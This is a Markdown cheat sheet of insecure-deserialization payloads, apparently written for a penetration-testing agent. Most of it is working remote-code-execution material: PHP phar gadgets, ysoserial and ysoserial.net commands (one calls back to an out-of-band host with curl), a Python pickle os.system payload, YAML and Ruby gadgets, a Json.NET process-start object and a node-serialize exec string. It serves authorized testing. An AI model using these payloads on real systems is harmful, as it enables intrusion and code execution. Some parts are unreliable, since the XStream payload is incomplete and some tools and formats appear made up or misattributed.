# payloads — deserialization-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Técnico de Desserialização Insegura e Metodologia de Testes.md` (Section 5: PAYLOADS / PROBES)

All RCE-producing payloads use harmless test commands (`id`, `sleep`,
`hostname`). Do NOT substitute destructive commands without
`destructive_testing: approved`.

---

## 1. Identify the Serialization Format

Decode the blob (Base64 / Hex) and inspect the leading bytes:

| First bytes (decoded)          | Language / Format                            |
|--------------------------------|----------------------------------------------|
| `rO0AB...` / `aced0005`        | Java `ObjectOutputStream` (binary)           |
| `O:N:"ClassName":...`          | PHP `serialize()`                            |
| `a:N:{i:0;...}`                | PHP array                                    |
| `\x80\x03`, `\x80\x04`, `cc`   | Python Pickle (protocol 3/4)                 |
| `\x04\x08`                     | Ruby `Marshal.dump`                          |
| `!ruby/object:...` (YAML)      | Ruby YAML.load (unsafe)                      |
| `---` + class tag              | YAML (any)                                   |
| `BMCF` / structured binary     | .NET BinaryFormatter                         |
| JSON with `$type` / `@type`    | .NET / Jackson polymorphic — gadget-prone    |

Cookies, hidden form fields, and custom headers are common carriers.

---

## 2. PHP — `unserialize()` Injection

### Basic field-tamper test

Change role / admin fields:

```
O:4:"User":3:{s:2:"id";i:1;s:4:"name";s:5:"alice";s:5:"admin";b:0;}
                                                            ^
                                              tamper b:0 → b:1
```

Or change visibility:

```
O:4:"User":3:{s:6:"*balance";i:0;...}   # protected — "*" + "\0*\0"
# Null bytes are preserved when URL-encoded: %00*%00
```

### Example RCE probe (Phar-based, Symfony)

```php
// Build a phar archive locally:
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new RCE_Gadget();
$obj->cmd = "id";
$phar->setMetadata($obj);
$phar->stopBuffering();
// Upload exploit.phar to the server, then reference it via phar:// URL
```

Pass `phar:///path/to/exploit.phar` as any argument that reaches a PHP
file-system function (`file_exists`, `md5_file`, `fopen`) — triggers
unserialize.

---

## 3. Java — `readObject()` Injection

### Detection

Paste the blob into `SerializationDumper` or CyberChef to confirm it
parses; if yes, the server deserializes user-supplied Java objects.

### ysoserial gadget-chain generation

Run on an attacker-controlled box (NOT the target):

```bash
# Pick a gadget chain based on what's on the target's classpath.
# Common: CommonsCollections1, CommonsCollections5, Spring1, Hibernate1.
java -jar ysoserial.jar CommonsCollections5 "curl http://OOB/j1" > payload.bin

# Or for in-band OS command:
java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwn-test" > payload.bin

# Base64-encode for HTTP transport:
base64 < payload.bin
```

Replace the legitimate blob in the cookie / header / body with the
base64 output.

### Timing probe (no RCE yet)

```
# A harmless gadget that sleeps for 5 seconds to confirm deserialization path:
ysoserial CommonsCollections5 "sleep 5" > sleep.bin
```

### Tools

- `ysoserial` — classic gadget generator
- `marshalsec` — covers Java reflection, not just Apache Commons
- `GadgetInspector` — static analysis for custom gadget chains
- `rO0` (b64 alias) in Burp — paste the blob, generate permutations

---

## 4. Python — `pickle.loads()` Injection

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

Paste the base64 output as the cookie / field value. A non-destructive
test command is `id` or `hostname`.

### Defensive pattern for detection

If the application uses `yaml.load()` without a safe loader, test with:

```yaml
!!python/object/apply:os.system ["id"]
```

This triggers `os.system("id")` on deserialization.

---

## 5. Ruby — `Marshal.load` / `YAML.load` Injection

### Marshal — needs a gadget chain specific to the Rails version

```ruby
# Proof of concept generator (see phpggc-ruby, rubysecadvise):
require "base64"
require "marshal_rb"
code = "`id`"
payload = Marshal.dump(MarshalRb::Gadget.build(code))
puts Base64.strict_encode64(payload)
```

### YAML.load — `!!ruby/object` tag (Rails < 6 unsafe by default)

```yaml
!ruby/object:Gem::Installer
  i: x
  method: "`id`"
```

Rails 5.1+ uses `YAML.safe_load` by default — pre-5 versions or
explicit `YAML.load(user_input)` remain vulnerable.

---

## 6. .NET — BinaryFormatter / DataContractSerializer / Json.NET

### BinaryFormatter

Generate with `ysoserial.net`:

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"
```

### Json.NET with `TypeNameHandling.All`

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "calc.exe"
    }
  }
}
```

Send to an endpoint that accepts a `JsonConvert.DeserializeObject(input,
settings)` where `settings.TypeNameHandling != None`.

---

## 7. XStream (Java XML-based serialization)

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <pojo class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler dataContentType="text/plain" transferFlavors="0">
          <contentType>text/plain</contentType>
          <is class="javax.crypto.CipherInputStream"></is>
        </dataHandler>
      </pojo>
    </jdk.nashorn.internal.objects.NativeString>
  </entry>
</map>
```

## 8. JavaScript / Node.js — node-serialize / funcster

```javascript
// IIFE-style gadget
const payload = '{"rce":"_$$ND_FUNC$$_function (){require(\\"child_process\\").exec(\\"id\\", console.log); }()"}';
```

---

## 9. Generic Detection — Long Encoded Blobs

When you see a cookie / hidden field whose value is >40 chars of
base64/hex, decode it — the leading bytes reveal the format.

```bash
# Base64 peek
echo "$BLOB" | base64 -d | xxd | head -2

# If it's obviously gzipped:
echo "$BLOB" | base64 -d | gunzip | xxd | head -2
```

Encoded + compressed + encrypted blobs are common — signed/encrypted
blobs are usually safe. Blobs without a HMAC or signature are prime
targets for tampering.

---

## 10. Signal Classification

| Response to tampered blob                  | Meaning                                  |
|--------------------------------------------|------------------------------------------|
| 200 OK, altered behaviour (role change)    | Field-tamper confirmed — NO signature    |
| 500 / stack trace mentioning `readObject`  | Deserialization path confirmed; try RCE  |
| 400 / "invalid signature"                  | Blob is HMAC-protected — focus elsewhere |
| 200 OK, no behavioural change              | Server stores but doesn't deserialize    |

---

## Safety Notes

- Gadget-chain RCE payloads are immediately destructive if the test
  command is wrong — always start with `sleep 5` (timing probe) before
  `id`.
- `ysoserial` payloads execute on the target host; ensure the host is
  a staging server, not production, and that `destructive_testing:
  approved` is set.
- Do not probe deserialization on production without a snapshot / revert
  plan — a bad gadget can crash the process.
- Blob modifications can trigger DB writes if the object persists.
  Test in a transaction-rollback mode if possible.
